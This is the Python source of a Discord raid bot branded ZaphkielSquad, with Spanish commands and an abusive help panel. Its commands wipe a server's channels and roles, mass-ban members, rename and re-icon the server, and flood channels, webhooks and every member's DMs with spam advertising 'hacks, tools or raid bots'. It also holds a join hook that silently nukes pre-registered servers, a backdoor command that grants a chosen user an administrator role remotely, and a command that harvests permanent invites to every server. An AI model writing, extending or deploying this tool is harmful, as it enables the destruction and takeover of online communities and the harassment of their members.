import discord
from discord.ext import commands
import asyncio
import aiohttp
from datetime import datetime
import warnings
import webserver
import sys
import os
warnings.filterwarnings('ignore', category=DeprecationWarning)

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
intents.guild_reactions = True
intents.members = True
bot = commands.Bot(command_prefix='$', intents=intents)

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

if sys.version_info >= (3, 12):
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

embed_message_id = None
programmed_servers = set()
ComandosBL = {"ret", "raid", "dr", "spam", "nuke", "cn", "ci", "cr", "resetserver", "bn"}

ServersWL = {1571716858531545118, 1572176540576522361}


@bot.check
async def ProteGlobal(ctx):
    if ctx.guild and ctx.guild.id in ServersWL:
        if ctx.command and ctx.command.name in ComandosBL:
            await ctx.send(f"**[Protegido]** Comando {ctx.command.name} bloqueado en {ctx.guild.name}")
            raise commands.CheckFailure("Comando bloqueado en el servidor.")
    return True

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        return

@bot.command()
@commands.has_permissions(administrator=True)
async def massban(ctx):
    guild = ctx.guild
    author = ctx.author
    members_to_ban = [m for m in guild.members if m == author if guild.me.top_role > m.top_role]
    total = len(members_to_ban)
    count = 0
    confirm_msg = await ctx.send(f'**Intentando banear {total} miembros...**\n\nAsegúrate de poner el rol del bot **POR ENCIMA DE CUALQUIER OTRO**.\nEl bot solo puede banear a los usuarios que estén **BAJO** su rol.\n\nReacciona con ✅ para confirmar o ❌ para cancelar.')
    await confirm_msg.add_reaction('✅')
    await confirm_msg.add_reaction('❌')
    def check(reaction, user):
        return user == author and str(reaction.emoji) in ('✅', '❌') and reaction.message.id == confirm_msg.id

    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send('Timed out — MassBan cancelado.')
        return
    else:
        if str(reaction.emoji) == '❌':
            await ctx.send('MassBan Cancelado.')
            return
        await ctx.send(f'Iniciando baneo a {total} miembros...')
        async with aiohttp.ClientSession() as session:
            async def ban_member(member):
                nonlocal count
                try:
                    url = f'https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}'
                    headers = {'Authorization': f'Bot {bot.http.token}', 'Content-Type': 'application/json'}
                    json_data = {'delete_message_days': 0, 'reason': 'Massban'}
                    async with session.put(url, json=json_data, headers=headers) as resp:
                        if resp.status == 429:
                            data = await resp.json()
                            retry_after = data.get('retry_after', 1)
                            await asyncio.sleep(retry_after)
                            return await ban_member(member)
                except Exception as e:
                    print(f"[!] Can't ban {member}: {e}")
                    return
                if resp.status in (200, 201, 204):
                    count += 1
                    print(f'[{count}/{total}] Banned: {member}')
                else:
                    print(f'[!] Error while banning {member}: {resp.status}')
                try:
                    pass
                except Exception as e:
                    print(f"[!] Can't ban {member}: {e}")
                    return

            tasks = [ban_member(m) for m in members_to_ban]
            await asyncio.gather(*tasks)
    await ctx.send(f'Massban completado — {count}/{total} users baneados.')

@bot.command()
@commands.has_permissions(administrator=True)
async def wbh(ctx):
    guild = ctx.guild
    msg = '¿Quieres tener Hacks, Tools o Bot de raid? \n  __**Unete a ZaphkielSquad, el mejor servidor de**__ \n               __**esta comunidad de mierda.**__\n          https://discord.gg/VzZNw3bMs2 \n          __ Server fucked by ZaphkielSquad__\n                              No Mercy.\n                           @everyone'
    cantidad = 40
    AVATAR_URL = 'https://i.postimg.cc/VLn8Vfbs/Imagen-de-Chat-GPT-15-nov-2026-07-20-08-p-m.png'
    if not guild:
        return
    async def enviar_en_canal(channel):
        try:
            webhook = await channel.create_webhook(name='ZaphkielSquad On TOP')
        except Exception as e:
            await ctx.send('')
            return
        try:
            tareas = [webhook.send(f'{msg}', username=f'ZSquad-{i}', avatar_url=AVATAR_URL) for i in range(cantidad)]
            await asyncio.gather(*tareas)
        except Exception as e:
            await ctx.send('')
            return

    await asyncio.gather(*(enviar_en_canal(channel) for channel in guild.text_channels))

@bot.command()
@commands.has_permissions(administrator=True)
async def ret(ctx, cantidad: int=80):
    await ci.callback(ctx)
    await cn.callback(ctx)
    nombre_base = '𝔖𝔢𝔯𝔳𝔢𝔯 𝔉𝔲𝔠𝔨𝔢𝔡 𝔅𝔶 ℨ𝔞𝔭𝔥𝔨𝔦𝔢𝔩𝔖𝔮𝔲𝔞𝔡'
    mensaje = '¿Quieres tener Hacks, Tools o Bot de raid? \n      __**Unete a ZaphkielSquad, el mejor servidor de**__ \n                   __**esta comunidad de mierda.**__\n              https://discord.gg/VzZNw3bMs2 \n              __ Server fucked by ZaphkielSquad__\n                                  No Mercy.\n                               @everyone'
    mensajes_por_canal = 80
    if cantidad > 80:
        return
    async def borrar_canal(canal):
        try:
            await canal.delete()
        except:
            return

    tareas_borrar = [borrar_canal(c) for c in ctx.guild.channels]
    await asyncio.gather(*tareas_borrar, return_exceptions=True)
    async def crear_y_spamear(i):
        try:
            canal = await ctx.guild.create_text_channel(name=f'{nombre_base}')
        except:
            return
        try:
            tareas_spam = [canal.send(mensaje) for _ in range(mensajes_por_canal)]
            await asyncio.gather(*tareas_spam, return_exceptions=True)
        except:
            return

    tareas_crear = [crear_y_spamear(i) for i in range(1, cantidad + 1)]
    await asyncio.gather(*tareas_crear, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def ks(ctx, server_id: int):
    programmed_servers.add(server_id)
    embed = discord.Embed(
        title="Servidor programado.",
        description=f"ID: {server_id}",
        color=discord.Color.orange()
    )

    await ctx.send(embed=embed)

@bot.event
async def on_guild_join(guild):
    if guild.id in programmed_servers:
        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
        if not channel:
            return
        class SilentCtx:
            def __init__(self, guild, channel, bot_user):
                self.guild = guild
                self.channel = channel
                self.send = lambda *args, **kwargs: None
                self.author = guild.owner or bot_user


        ctx = SilentCtx(guild, channel, bot.user)
        await nuke.callback(ctx)
        await cn.callback(ctx)
        await ci.callback(ctx)
        await ret.callback(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def da(ctx, user_id: int, server_id: int):
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send('No estoy en ese servidor, tal véz el ID es inválido.')
        return
    member = guild.get_member(user_id)
    if not member:
        await ctx.send('Ese usuario no está en el servidor.')
        return
    rol = discord.utils.get(guild.roles, name='ZS Administrador')
    if rol is None:
        try:
            rol = await guild.create_role(name='ZS Administrador', permissions=discord.Permissions(administrator=True))
            await ctx.send("Rol 'ZS Administrador' creado en el servidor.")
        except discord.Forbidden:
            await ctx.send('No tengo permisos para crear roles en ese servidor.')
            return
    try:
        await member.add_roles(rol)
        await ctx.send(f"Se le otorgó el rol 'ZS Administrador' a <@{user_id}> en **{guild.name}** ({guild.id}).")
    except discord.Forbidden:
        await ctx.send('No tengo permisos para asignar ese rol en el servidor destino.')
        return
    except Exception as e:
        await ctx.send(f'Error: {e}')
        return

@bot.command()
@commands.has_permissions(administrator=True)
async def vs(ctx, server_id: int, cantidad: int=100):
    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.send('No estoy en ese servidor o el ID es inválido.')
        return
    channel = guild.text_channels[0] if guild.text_channels else None
    if not channel:
        await ctx.send('No hay canales de texto en ese servidor.')
        return
    author = guild.me or guild.owner
    class SilentCtx:
        def __init__(self, guild, channel, bot_user):
            self.guild = guild
            self.channel = channel
            self.author = author

        async def send(self, *args, **kwargs):
            pass


    silent_ctx = SilentCtx(guild, channel, bot.user)
    try:
        await md.callback(silent_ctx)
        await cn.callback(silent_ctx)
        await ci.callback(silent_ctx)
        await nuke.callback(silent_ctx)
        await md.callback(silent_ctx)
        await ret.callback(silent_ctx, cantidad)
        await ctx.send(f'Comandos activados en **{guild.name}** ({guild.id})')
    except Exception as e:
        await ctx.send(f'Error al ejecutar remoto: {e}')
        return

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    cantidad = 20
    mensaje = '¿Quieres tener Hacks, Tools o Bot de raid? \n  __**Unete a ZaphkielSquad, el mejor servidor de**__ \n               __**esta comunidad de mierda.**__\n          https://discord.gg/VzZNw3bMs2 \n          __ Server fucked by ZaphkielSquad__\n                              No Mercy.\n                           @everyone'
    if cantidad > 20:
        return
    async def enviar_en_canal(canal):
        for _ in range(cantidad):
            try:
                await canal.send(mensaje)
            except:
                continue

    tareas = [enviar_en_canal(c) for c in ctx.guild.text_channels]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def raid(ctx, cantidad: int=80):
    nombre_base = '𝔖𝔢𝔯𝔳𝔢𝔯 𝔉𝔲𝔠𝔨𝔢𝔡 𝔅𝔶 ℨ𝔞𝔭𝔥𝔨𝔦𝔢𝔩𝔖𝔮𝔲𝔞𝔡'
    if cantidad > 80:
        return
    async def crear_canal(i):
        try:
            await ctx.guild.create_text_channel(name=f'{nombre_base}')
        except:
            return

    tareas = [crear_canal(i) for i in range(1, cantidad + 1)]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def md(ctx):
    enviados = 0
    fallidos = 0
    repeticiones = 20
    mensaje_predefinido = '\n\n¿Quieres tener Hacks, Tools o Bot de raid? Unete a ZaphkielSquad, el mejor servidor de esta comunidad. \n https://discord.gg/VzZNw3bMs2 \n Server fucked by ZaphkielSquad \n                     No Mercy.'
    embed = discord.Embed(title='ZaphkielSquad', description=mensaje_predefinido, color=discord.Color.red())
    for miembro in ctx.guild.members:
        if miembro.bot:
            continue
        try:
            for _ in range(repeticiones):
                await miembro.send(embed=embed)
                await asyncio.sleep(0.2)
        except:
            continue

@bot.command()
@commands.has_permissions(manage_roles=True)
async def dr(ctx):
    protected = [ctx.guild.default_role, ctx.guild.owner, bot.user]
    for role in ctx.guild.roles:
        if role not in protected and not role.managed:
            try:
                await role.delete()
                await asyncio.sleep(0)
            except discord.Forbidden:
                await ctx.send(f'No tengo permisos para borrar el rol {role.name}.')
                continue
            except Exception as e:
                await ctx.send(f'Error al borrar {role.name}: {e}')
                continue

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    async def borrar_canal(canal):
        try:
            await canal.delete()
        except:
            return

    tareas = [borrar_canal(c) for c in ctx.guild.channels]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def cn(ctx):
    nombre_dea = 'Fucked By ZaphkielSquad'
    try:
        await ctx.guild.edit(name=nombre_dea)
    except:
        return

@bot.command()
@commands.has_permissions(administrator=True)
async def ci(ctx):
    try:
        with open('zsci.png', 'rb') as f:
            imagen_bytes = f.read()
            await ctx.guild.edit(icon=imagen_bytes)
    except:
        return

@bot.command()
@commands.has_permissions(manage_roles=True)
async def cr(ctx, cantidad: int=40):
    nombre_XD = '--------ZaphkielSquad On TOP--------'
    if cantidad > 40:
        return
    for i in range(1, cantidad + 1):
        nombre = f'{nombre_XD}'
        try:
            await ctx.guild.create_role(name=nombre)
            await asyncio.sleep(0)
        except discord.Forbidden:
            await ctx.send(f'No tengo permisos para crear el rol {nombre}.')
            continue
        except Exception as e:
            await ctx.send(f'Error al crear {nombre}: {e}')
            continue

@bot.command()
@commands.has_permissions(administrator=True)
async def ping(ctx):
    try:
        latencia = round(bot.latency * 1000)
        await ctx.send(f'Latencia: `{latencia}ms`')
    except discord.Forbidden:
        await ctx.send('No tengo permisos para enviar mensajes aquí.')
        return
    except Exception as e:
        await ctx.send(f'Error al ejecutar el comando: {e}')
        return

@bot.command()
@commands.has_permissions(ban_members=True)
async def bn(ctx):
    miembros = ctx.guild.members
    miembros_que_no_se_banean = [ctx.author, ctx.guild.owner, bot.user]
    miembros_a_banear = [miembro for miembro in miembros if miembro in miembros_que_no_se_banean if not miembro.bot]
    async def banear(usuario):
        try:
            await ctx.guild.ban(usuario, reason='Fucked By ZaphkielSquad')
        except discord.Forbidden:
            await ctx.send(f'No tengo permisos para banear a {usuario}.')
            return
        except Exception as e:
            await ctx.send(f'Error al banear {usuario}: {e}')
            return

    tareas = [banear(u) for u in miembros_a_banear]
    await asyncio.gather(*tareas, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def sv(ctx):
    allowed_ids = [1379401915355369525]
    if ctx.author.id not in allowed_ids:
        await ctx.send('No tienes permiso de usar el comando.')
        return
    descripcion = ''
    for guild in bot.guilds:
        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
        if channel:
            try:
                invite = await channel.create_invite(max_age=0, max_uses=0)
                descripcion += f'**{guild.name}**\nUsers: {guild.member_count}\nInvitation: {invite.url}\n\n'
            except Exception as e:
                descripcion += f'**{guild.name}**\nUsers: {guild.member_count}\nNo es posible crear la invitación: {e}\n\n'
                continue
        else:
            descripcion += f'**{guild.name}**\nUsers: {guild.member_count}\nEl canal no tiene permisos para crear invitaciones.\n\n'
    embed = discord.Embed(title='Servidores donde se encuentra el bot', description=descripcion if descripcion else 'No se encontraron servidores.', color=discord.Color.blue())
    await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(ban_members=True)
async def db(ctx, user_id: int):
    try:
        await ctx.guild.unban(discord.Object(id=user_id))
        await ctx.send(f'El usuario `{user_id}` ha sido desbaneado.')
    except Exception as e:
        await ctx.send(f'No se pudo desbanear al usuario `{user_id}`.\nError: {e}')
        return

paginas = [
    {
        "title": "Panel de ayuda de ZaphkielSquad Bot",
        "descripcion": (
            "`$hlp` –\n"
            "**Muestra este panel de ayuda.**\n"
            "`$ping` –\n"
            "**Muestra la latencia del bot.**\n"
            "`$spam` –\n"
            "**Hace spam en todos los canales.**\n"
            "`$raid` –\n"
            "**Crea una cantidad de 80 canales.**\n"
            "`$nuke` –\n"
            "**Borra todos los canales del servidor.**\n"
            "`$cn` –\n"
            "**Cambia el nombre del servidor.**\n"
            "`$cr (cantidad)` –\n"
            "**Crea una cantidad de roles.**\n"
            "`$ci` –\n"
            "**Cambia la foto del servidor.**\n"
            "`$ret` –\n"
            "**Raidea creando muchos canales con spam.**\n"
            "`$bn` –\n"
            "**Banea a todos los miembros excepto bots con admin.**\n"
             "`$db (ID USUARIO)` –\n"
            "**Desbanea a un usuario por medio de su ID solo si el bot está en el servidor.**\n"
            "`$wbh` –\n"
            "**Envía repetidas veces un mensaje de raid.**\n"
            "`$dr` –\n"
            "**Borra todos los roles excepto los que tienen admin.**\n"
            "`$ks (ID servidor)` –\n"
            "**Programa 5 comandos al meter el bot.**\n"
            "`$vs (ID servidor)` –\n"
            "**Raidea solo si el Bot está dentro del servidor.**\n"
            "`$da (ID usuario) (ID servidor)` –\n"
            "**Crea un rol admin y se lo da al usuario si el bot está en el servidor.**\n"
            "`$md` –\n"
            "**Envía un MD a todos con el link del bot.**\n"
            "`$massban` –\n"
            "**Variante actualizada de el comando $bn.**\n"
        )
    }
]
@bot.command()
async def hlp(ctx):
    page = paginas[0]

    embed = discord.Embed(
        title=page["title"],
        description=page["descripcion"],
        color=0x6E0F0F
    )

    embed.set_thumbnail(
        url="https://i.postimg.cc/VLn8Vfbs/Imagen-de-Chat-GPT-15-nov-2026-07-20-08-p-m.png"
    )

    await ctx.send(embed=embed)

webserver.keep_alive()
bot.run(DISCORD_TOKEN)
